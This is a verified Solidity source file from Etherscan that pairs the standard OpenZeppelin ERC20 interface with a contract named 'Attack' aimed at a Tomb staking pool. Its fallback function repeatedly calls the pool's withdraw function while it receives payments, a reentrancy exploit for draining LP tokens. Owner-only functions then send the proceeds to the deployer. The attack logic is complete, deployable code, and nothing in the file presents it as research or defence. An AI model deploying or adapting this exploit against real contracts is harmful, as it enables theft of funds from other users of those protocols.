/**
 *Submitted for verification at Etherscan.io on 2022-03-28
*/

// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.5.0/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: contracts/tomb/Attack.sol



pragma solidity ^0.8.0;


contract Attack {

    address public tomb;

    address public TSHARE_FTM;

    address public owner;

    address public WFTM;

    uint256 public withdDrawAmount;

    constructor(address _tomb, address _pairAddress, address _WFTM) {
        owner = msg.sender;
        tomb = _tomb;
        TSHARE_FTM = _pairAddress;
        WFTM = _WFTM;

    }

    fallback() external payable {
        if ( IERC20(WFTM).balanceOf(address(this)) >= 80000000000000000) {
            withdrawFromTromb(withdDrawAmount);
        }
    }

    modifier onlyOwner() {
        require (msg.sender == owner);
        _;
    }

    function setWithDrawAmount(uint256 _amount) public {
        withdDrawAmount = _amount;
    }

    function approveAlloance() external{
        IERC20(TSHARE_FTM).approve(address(tomb), IERC20(TSHARE_FTM).balanceOf(address(this)));
    }

    function deposit() external {
        bytes memory payload = abi.encodeWithSignature("deposit(uint256,uint256)", 0, IERC20(TSHARE_FTM).balanceOf(address(this)));
        (bool success, ) = tomb.call(payload);
        require(success, "deposit failed");
    }

    function withdrawFromTromb(uint256 _withDrawAmount) public{
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256,uint256)", 0, _withDrawAmount);
        (bool success,) = tomb.call(payload);
        require(success, "withdraw failed");
    }

    function withdrawAmount(uint _amount) external onlyOwner {
        IERC20 tokenContract = IERC20(TSHARE_FTM);
        tokenContract.transfer(msg.sender, _amount);
    }

    function withdrawAll() external onlyOwner  {
        IERC20 tokenContract = IERC20(TSHARE_FTM);
        tokenContract.transfer(msg.sender, IERC20(TSHARE_FTM).balanceOf(address(this)));
        
    }

    function withdrawToken(address _tokenContract, uint256 _amount) onlyOwner external {
        IERC20 tokenContract = IERC20(_tokenContract);
        tokenContract.transfer(msg.sender, _amount);
    }

    function balanceOfWFTM() external view returns (uint256){
        return IERC20(WFTM).balanceOf(address(this));
    }

    function balanceOfTSHARE_FTM() external view returns (uint256){
        return IERC20(TSHARE_FTM).balanceOf(address(this));
    }
}